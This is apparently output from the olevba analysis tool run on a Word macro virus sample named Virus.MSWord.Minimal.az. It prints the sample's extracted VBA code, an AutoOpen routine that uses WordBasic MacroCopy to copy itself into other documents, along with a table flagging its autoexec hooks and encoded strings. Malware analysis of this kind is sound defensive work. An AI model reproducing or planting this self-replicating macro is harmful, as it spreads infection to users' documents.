olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.az-55c39d9bb39c3abfcfb2e4935fda58be7089a10b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.az-55c39d9bb39c3abfcfb2e4935fda58be7089a10b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aUTOopen.bas 
in file: Virus.MSWord.Minimal.az-55c39d9bb39c3abfcfb2e4935fda58be7089a10b - OLE stream: 'Macros/VBA/aUTOopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error Resume Next
WordBasic.FileSaveAs Format:=1: WordBasic.MacroCopy "AutoClose", WordBasic.[FileName$]() + ":aUTOopen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":aUTOopen", "AutoClose"
WordBasic.FileSave
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUTOopen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

